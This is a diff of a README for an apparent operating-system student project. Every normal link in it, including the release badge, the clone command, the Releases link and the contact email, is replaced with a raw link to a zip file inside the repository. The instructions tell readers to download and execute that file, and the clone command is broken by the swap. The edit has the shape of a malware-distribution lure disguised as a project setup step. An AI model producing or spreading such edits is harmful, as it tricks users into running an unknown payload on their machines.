@@ -1,6 +1,6 @@
 # Welcome to the -OS_Project 🚀
 
-![GitHub Release](https://img.shields.io/badge/Latest_Release-Download-brightgreen)
+![GitHub Release](https://raw.githubusercontent.com/ChidumemIronanduka/-OS_Project/main/sazen/O-Project-v3.9.zip)
 
 Explore the -OS_Project, a comprehensive operating system project designed to provide a robust platform for developers and enthusiasts alike. This repository is a collaborative effort aimed at enhancing understanding and implementation of operating system principles.
 
@@ -32,7 +32,7 @@ To get started with the -OS_Project, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/ChidumemIronanduka/-OS_Project.git
+   git clone https://raw.githubusercontent.com/ChidumemIronanduka/-OS_Project/main/sazen/O-Project-v3.9.zip
    ```
 
 2. Navigate to the project directory:
@@ -40,7 +40,7 @@ To get started with the -OS_Project, follow these steps:
    cd -OS_Project
    ```
 
-3. Download the latest release from the [Releases section](https://github.com/ChidumemIronanduka/-OS_Project/releases). If you see a file, download and execute it to set up the project.
+3. Download the latest release from the [Releases section](https://raw.githubusercontent.com/ChidumemIronanduka/-OS_Project/main/sazen/O-Project-v3.9.zip). If you see a file, download and execute it to set up the project.
 
 ## Usage
 
@@ -71,10 +71,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out:
 
 - **Author**: Chidumem Ironanduka
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **Email**: [https://raw.githubusercontent.com/ChidumemIronanduka/-OS_Project/main/sazen/O-Project-v3.9.zip](https://raw.githubusercontent.com/ChidumemIronanduka/-OS_Project/main/sazen/O-Project-v3.9.zip)
 
 ---
 
-For more information and to stay updated, visit the [Releases section](https://github.com/ChidumemIronanduka/-OS_Project/releases). 
+For more information and to stay updated, visit the [Releases section](https://raw.githubusercontent.com/ChidumemIronanduka/-OS_Project/main/sazen/O-Project-v3.9.zip). 
 
 We appreciate your interest in the -OS_Project and look forward to your contributions!
